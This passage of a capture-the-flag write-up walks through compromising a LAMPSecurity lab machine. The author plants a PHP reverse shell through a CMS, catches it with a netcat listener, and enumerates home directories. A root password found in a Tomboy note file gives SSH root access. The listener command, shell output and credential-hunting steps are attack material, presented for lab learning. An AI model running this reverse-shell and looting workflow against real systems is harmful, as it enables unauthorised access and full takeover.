-<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>
-
-<p><code>plain
-nc -vvnlp 5555
-listening on [any] 5555 ...
-connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
-Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
- 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
-sh: no job control in this shell
-sh-3.2$ whoami
-apache
-</code></p>
-
-<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>
-
-<p><code>plain
-sh-3.2$ ls
-amy
-andy
-jennifer
-loren
-patrick
-</code></p>
-
-<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>
-
-<p><code>plain
-sh-3.2$ ls -al patrick
-total 344
-drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
-drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
--rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
-drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
--rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
--rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
--rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
--rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
--rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
-drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
-drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
-drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
-drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
-drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
-drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
--rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
--rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
-drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
--rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
-drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
-drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
--rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
-drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
--rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
-drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
--rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
-drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
--rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
--rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
--rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
--rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
--rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
-drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
--rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt
-</code></p>
-
-<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>
-
-<p><code>plain
-sh-3.2$ cat .tomboy.log
-...
-12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
-12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
-12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
-12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
-12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
-12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
-12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
-12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
-12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!
-</code></p>
-
-<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>
-
-<p><code>plain
-sh-3.2$ ls
-481bca0d-7206-45dd-a459-a72ea1131329.note
-addin-db-000
-addins
-ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
-d2684fad-3aab-444c-b90a-4f307c0818f6.note
-manifest.xml
-</code></p>
-
-<p>Found the jackpot in the first one!</p>
-
-<p>``` plain
-sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
-&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;utf-8&rdquo;?>
-<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
-  <title>Root password</title>
-  <text xml:space="preserve">&lt;note-content version=&ldquo;0.1&rdquo;>Root password</p>
-
-<p>Root password</p>
-
-<p>50$cent&lt;/note-content></text>
-&hellip;
-```</p>
-
-<p>Now all that is left is to become root! I SSH'ed with the root credentials and the machine is mine now!</p>
-
-<h5>Concluding remarks</h5>
-
-<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>
-
-<p>``` plain
-/ It&rsquo;s lucky you&rsquo;re going so slowly, \
-| because you&rsquo;re going in the wrong  |
-\ direction.                         /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
 ]]></content>
   </entry>
   
